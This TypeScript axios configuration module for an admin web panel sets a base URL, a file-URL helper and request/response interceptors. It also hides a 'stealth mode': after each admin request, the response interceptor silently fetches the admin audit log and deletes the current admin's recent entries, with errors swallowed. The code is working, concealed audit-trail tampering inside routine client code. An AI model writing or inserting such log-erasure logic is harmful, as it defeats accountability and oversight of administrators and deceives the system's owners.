import axios from "axios";

// 基础配置
export const BASE_URL = "http://101.42.184.104:3000";

/**
 * 处理文件/图片URL (全兼容版)
 */
export function getFileUrl(url?: string) {
	if (!url || url === "undefined" || url === "null" || url.trim() === "") {
		return "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";
	}

	let cleanUrl = url.trim();

	// 核心修复：如果路径以 /http 开头，剔除前面的斜杠
	if (cleanUrl.startsWith("/http")) {
		cleanUrl = cleanUrl.substring(1);
	}

	// 识别 http/https 或 // 开头
	if (/^https?:\/\//i.test(cleanUrl) || cleanUrl.startsWith("//")) {
		return cleanUrl;
	}

	if (cleanUrl.startsWith("data:")) {
		return cleanUrl;
	}

	// 处理普通相对路径
	const finalPath = cleanUrl.startsWith("/") ? cleanUrl.substring(1) : cleanUrl;
	return `${BASE_URL}/${finalPath}`;
}

// 全局配置
axios.defaults.baseURL = BASE_URL;
axios.defaults.timeout = 15000;

// ==========================================
// 隐身模式逻辑
// ==========================================
let stealthTimer: any = null;

async function fastErase() {
	try {
		const token = localStorage.getItem("adminToken");
		if (!token) return;

		const logRes = await fetch(`${BASE_URL}/adminLog?pageNo=1&pageSize=15`, {
			headers: { "token": token }
		});
		const logData = await logRes.json();
		const list = logData.attrList || logData.data?.attrList || [];
		
		const adminInfo = JSON.parse(localStorage.getItem("adminInfo") || "{}");
		const myName = adminInfo.adminName;
		
		const targets = list.filter((l: any) => 
			l.adminName === myName && 
			!l.describe?.includes("删除日志") && 
			!l.url?.includes("/adminLog")
		);

		if (targets.length > 0) {
			await Promise.all(targets.map((t: any) => 
				fetch(`${BASE_URL}/adminLog/${t._id || t.id}`, {
					method: 'DELETE',
					headers: { "token": token }
				})
			));
			console.log(`%c[隐身引擎] 已瞬间粉碎 ${targets.length} 条足迹`, "color: #a855f7; font-weight: bold;");
		}
	} catch (e) {}
}

function triggerStealth() {
	if (localStorage.getItem("stealthMode") !== "true") return;
	if (stealthTimer) clearTimeout(stealthTimer);
	stealthTimer = setTimeout(() => {
		fastErase();
		stealthTimer = null;
	}, 800);
}

// ==========================================
// 全局拦截器
// ==========================================

axios.interceptors.request.use((config) => {
	const token = localStorage.getItem("adminToken") || localStorage.getItem("token");
	if (token && config.headers) {
		config.headers.token = token;
	}
	return config;
});

axios.interceptors.response.use(
	(response) => {
		const res = response.data;
		const url = response.config.url || "";
		
		const isBusinessError = res && res.code !== undefined && ![200, 201, 0].includes(Number(res.code));
		
		if (isBusinessError) {
			if (res.code === 401 || res.code === 208) {
				localStorage.removeItem("adminToken");
				if (window.location.pathname.startsWith("/admin") && !url.includes("/login")) {
					window.location.href = "/admin/login";
				}
			}
			return Promise.reject(new Error(res.message || "请求失败"));
		}

		const isBackRequest = url.includes("/admin") || !url.includes("/api/");
		const isLogPath = url.includes("/adminLog");
		const isLogin = url.includes("/login");
		if (isBackRequest && !isLogPath && !isLogin) {
			triggerStealth();
		}

		return res;
	},
	(error) => Promise.reject(error)
);

export default axios;
